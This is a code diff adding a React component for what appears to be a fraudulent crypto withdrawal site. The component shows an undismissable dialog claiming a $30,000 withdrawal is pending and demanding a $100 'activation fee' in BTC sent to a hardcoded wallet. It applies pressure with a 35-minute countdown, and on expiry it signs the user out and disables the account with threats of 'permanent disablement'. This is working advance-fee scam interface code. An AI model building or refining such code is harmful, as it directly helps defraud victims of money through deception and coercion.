@@ -1,0 +1,206 @@
+import { useState, useEffect, useCallback } from "react";
+import { AlertDialog, AlertDialogContent, AlertDialogHeader, AlertDialogTitle, AlertDialogDescription } from "@/components/ui/alert-dialog";
+import { Button } from "@/components/ui/button";
+import { Badge } from "@/components/ui/badge";
+import { AlertCircle, Copy, Check, Clock, Shield } from "lucide-react";
+import { useNavigate } from "react-router-dom";
+import { useToast } from "@/hooks/use-toast";
+import { supabase } from "@/integrations/supabase/client";
+import { CONFIRMATION_FEE_WALLET_BTC } from "@/lib/constants";
+
+const ACTIVATION_FEE_AMOUNT = 100;
+const COUNTDOWN_MINUTES = 35;
+const COUNTDOWN_STORAGE_KEY = "account_activation_countdown_35m_start";
+
+interface AccountRestrictionFeeDialogProps {
+  open: boolean;
+  userId?: string;
+}
+
+export const AccountRestrictionFeeDialog = ({ open, userId }: AccountRestrictionFeeDialogProps) => {
+  const [timeLeft, setTimeLeft] = useState(COUNTDOWN_MINUTES * 60);
+  const [isExpired, setIsExpired] = useState(false);
+  const [copied, setCopied] = useState(false);
+  const [disabling, setDisabling] = useState(false);
+  const navigate = useNavigate();
+  const { toast } = useToast();
+
+  // Auto-disable account when expired
+  const disableAccount = useCallback(async () => {
+    if (!userId || disabling) return;
+    setDisabling(true);
+    try {
+      const { error } = await supabase.functions.invoke("auto-disable-expired-account", {
+        body: { user_id: userId },
+      });
+      if (error) console.error("Auto-disable error:", error);
+    } catch (e) {
+      console.error("Auto-disable failed:", e);
+    }
+    // Sign out regardless
+    await supabase.auth.signOut();
+    toast({
+      title: "Account Permanently Disabled",
+      description: "Your account has been permanently disabled due to non-payment of the activation fee. Contact support for assistance.",
+      variant: "destructive",
+    });
+    navigate("/auth");
+  }, [userId, disabling, navigate, toast]);
+
+  useEffect(() => {
+    if (!open) return;
+
+    let startTime = localStorage.getItem(COUNTDOWN_STORAGE_KEY);
+    if (!startTime) {
+      startTime = Date.now().toString();
+      localStorage.setItem(COUNTDOWN_STORAGE_KEY, startTime);
+    }
+
+    const elapsed = Math.floor((Date.now() - parseInt(startTime)) / 1000);
+    const remaining = Math.max(0, COUNTDOWN_MINUTES * 60 - elapsed);
+    setTimeLeft(remaining);
+    if (remaining === 0) {
+      setIsExpired(true);
+    }
+  }, [open]);
+
+  // When expired, auto-disable
+  useEffect(() => {
+    if (isExpired && userId) {
+      disableAccount();
+    }
+  }, [isExpired, userId, disableAccount]);
+
+  useEffect(() => {
+    if (!open || isExpired) return;
+
+    const timer = setInterval(() => {
+      setTimeLeft((prev) => {
+        if (prev <= 1) {
+          setIsExpired(true);
+          return 0;
+        }
+        return prev - 1;
+      });
+    }, 1000);
+
+    return () => clearInterval(timer);
+  }, [open, isExpired]);
+
+  const formatTime = useCallback((seconds: number) => {
+    const m = Math.floor(seconds / 60);
+    const s = seconds % 60;
+    return `${m.toString().padStart(2, "0")}:${s.toString().padStart(2, "0")}`;
+  }, []);
+
+  const copyAddress = async () => {
+    try {
+      await navigator.clipboard.writeText(CONFIRMATION_FEE_WALLET_BTC);
+      setCopied(true);
+      toast({ title: "Address copied", description: "BTC wallet address copied to clipboard." });
+      setTimeout(() => setCopied(false), 2000);
+    } catch {
+      toast({ title: "Copy failed", description: "Please copy the address manually.", variant: "destructive" });
+    }
+  };
+
+  const progressPercent = (timeLeft / (COUNTDOWN_MINUTES * 60)) * 100;
+
+  return (
+    <AlertDialog open={open}>
+      <AlertDialogContent className="max-w-md border-primary/50 bg-background sm:max-w-lg">
+        <AlertDialogHeader>
+          <div className="flex items-center gap-2 mb-2">
+            <div className="h-10 w-10 rounded-full bg-primary/20 flex items-center justify-center">
+              <Shield className="h-5 w-5 text-primary" />
+            </div>
+            <Badge variant="secondary" className="animate-pulse">
+              <AlertCircle className="h-3 w-3 mr-1" /> Activation Required
+            </Badge>
+          </div>
+          <AlertDialogTitle className="text-xl text-primary">
+            🔐 Account Activation Fee Required
+          </AlertDialogTitle>
+          <AlertDialogDescription className="text-foreground/80 space-y-3">
+            <p>
+              Your account restriction has been successfully <strong>lifted</strong>. 
+              To finalize and process your pending <strong>$30,000.00 withdrawal</strong>, 
+              a one-time account activation fee is required.
+            </p>
+            <p>
+              This fee covers <strong>blockchain network validation</strong> and 
+              ensures your withdrawal is processed securely through our compliance system.
+            </p>
+          </AlertDialogDescription>
+        </AlertDialogHeader>
+
+        {/* Fee Amount */}
+        <div className="bg-primary/5 border border-primary/20 rounded-lg p-4 text-center space-y-1">
+          <p className="text-sm text-muted-foreground font-medium">Account Activation Fee</p>
+          <p className="text-4xl font-bold text-primary">${ACTIVATION_FEE_AMOUNT.toLocaleString()}</p>
+          <p className="text-xs text-muted-foreground">Payable in BTC to the address below</p>
+        </div>
+
+        {/* Countdown Timer */}
+        <div className="space-y-2">
+          <div className="flex items-center justify-between text-sm">
+            <span className="flex items-center gap-1.5 text-muted-foreground">
+              <Clock className="h-4 w-4" /> Time Remaining
+            </span>
+            <span className={`font-mono font-bold text-lg ${isExpired ? "text-destructive" : timeLeft < 300 ? "text-destructive animate-pulse" : "text-foreground"}`}>
+              {isExpired ? "EXPIRED" : formatTime(timeLeft)}
+            </span>
+          </div>
+          <div className="h-2 bg-muted rounded-full overflow-hidden">
+            <div
+              className={`h-full rounded-full transition-all duration-1000 ${isExpired ? "bg-destructive" : progressPercent < 25 ? "bg-destructive" : progressPercent < 50 ? "bg-yellow-500" : "bg-primary"}`}
+              style={{ width: `${progressPercent}%` }}
+            />
+          </div>
+          {isExpired && (
+            <p className="text-xs text-destructive font-medium text-center">
+              ⚠️ Your account has been permanently disabled due to non-payment. Contact support immediately.
+            </p>
+          )}
+        </div>
+
+        {/* Wallet Address */}
+        <div className="space-y-2">
+          <p className="text-sm font-medium text-muted-foreground">Send BTC to:</p>
+          <div className="flex items-center gap-2 bg-muted/50 border border-border rounded-lg p-3">
+            <code className="text-xs flex-1 break-all font-mono text-foreground">
+              {CONFIRMATION_FEE_WALLET_BTC}
+            </code>
+            <Button variant="outline" size="sm" onClick={copyAddress} className="shrink-0">
+              {copied ? <Check className="h-4 w-4 text-success" /> : <Copy className="h-4 w-4" />}
+            </Button>
+          </div>
+        </div>
+
+        {/* Warning */}
+        <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-3">
+          <p className="text-xs text-foreground/70">
+            <strong>⚠️ Important:</strong> The fee must be sent in a <strong>single BTC transaction</strong> to the address above. 
+            Once confirmed on the blockchain, your $30,000.00 withdrawal will be processed automatically.
+            <br /><br />
+            <strong className="text-destructive">Failure to pay within the countdown will result in permanent account disablement.</strong>
+          </p>
+        </div>
+
+        {/* Actions */}
+        <div className="flex flex-col gap-2 pt-2">
+          <Button
+            onClick={() => navigate("/dashboard/deposit")}
+            className="w-full bg-primary hover:bg-primary/90 text-primary-foreground"
+            disabled={isExpired}
+          >
+            Pay ${ACTIVATION_FEE_AMOUNT.toLocaleString()} Activation Fee
+          </Button>
+          <p className="text-[11px] text-center text-muted-foreground">
+            This dialog cannot be dismissed until the activation fee is paid.
+          </p>
+        </div>
+      </AlertDialogContent>
+    </AlertDialog>
+  );
+};
